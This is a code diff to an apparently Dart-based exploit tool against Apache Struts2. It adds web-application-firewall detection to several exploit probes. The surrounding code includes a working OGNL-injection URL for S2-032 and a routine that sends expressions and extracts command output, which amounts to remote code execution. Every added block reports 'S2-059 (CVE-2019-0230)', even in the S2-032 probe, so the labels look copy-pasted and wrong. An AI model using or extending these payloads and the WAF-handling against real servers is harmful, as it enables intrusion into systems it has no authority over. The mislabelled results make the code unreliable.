@@ -5,6 +5,7 @@ import 'package:http/http.dart' as http;
 
 import 'services/exp_result.dart';
 import 'services/rce_encoder.dart';
+import 'services/waf_detect.dart';
 
 enum Struts2VulnType {
   s2032('S2-032 (CVE-2016-3081, Struts 2.3.20-2.3.28)', 'DMI 方法 OGNL 注入'),
@@ -81,6 +82,12 @@ class Struts2ExpService {
       final detectUrl =
           '${baseUri}index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3d"54289",%23w.print(%23s),%23w.close(),1?%23xx:%23request.toString&encoding=UTF-8';
       final res = await http.get(Uri.parse(detectUrl)).timeout(timeout);
+      if (looksLikeWafBlock(res.statusCode, res.body)) {
+        return ExpResult.probeFailed(
+          'S2-059 (CVE-2019-0230)',
+          '疑似被 WAF 拦截 (HTTP ${res.statusCode})',
+        );
+      }
       if (res.body.contains('54289')) {
         return ExpResult(
           true,
@@ -109,6 +116,12 @@ class Struts2ExpService {
             body: payload,
           )
           .timeout(timeout);
+      if (looksLikeWafBlock(res.statusCode, res.body)) {
+        return ExpResult.probeFailed(
+          'S2-059 (CVE-2019-0230)',
+          '疑似被 WAF 拦截 (HTTP ${res.statusCode})',
+        );
+      }
       if (res.body.contains('54289')) {
         return ExpResult(
           true,
@@ -205,6 +218,12 @@ class Struts2ExpService {
             body: payload,
           )
           .timeout(timeout);
+      if (looksLikeWafBlock(res.statusCode, res.body)) {
+        return ExpResult.probeFailed(
+          'S2-059 (CVE-2019-0230)',
+          '疑似被 WAF 拦截 (HTTP ${res.statusCode})',
+        );
+      }
       if (res.body.contains('54289')) {
         return ExpResult(
           true,
@@ -352,6 +371,12 @@ class Struts2ExpService {
             body: 'username=x&password=x&$field=${Uri.encodeQueryComponent(payload)}',
           )
           .timeout(timeout);
+      if (looksLikeWafBlock(res.statusCode, res.body)) {
+        return ExpResult.probeFailed(
+          'S2-059 (CVE-2019-0230)',
+          '疑似被 WAF 拦截 (HTTP ${res.statusCode})',
+        );
+      }
       if (res.body.contains('54289')) {
         return ExpResult(
           true,
@@ -569,6 +594,10 @@ class Struts2ExpService {
       final res = await http
           .post(baseUri, body: <String, String>{'id': expr})
           .timeout(timeout);
+      if (looksLikeWafBlock(res.statusCode, res.body) ||
+          looksLikeBlockedBody(res.body)) {
+        return '[Blocked] 命令未执行：疑似被 WAF 拦截 (HTTP ${res.statusCode})';
+      }
       final match = RegExp(r'<a id="([^"]*)"').firstMatch(res.body);
       final out = match?.group(1)?.trim() ?? '';
       return out.isEmpty ? null : out;
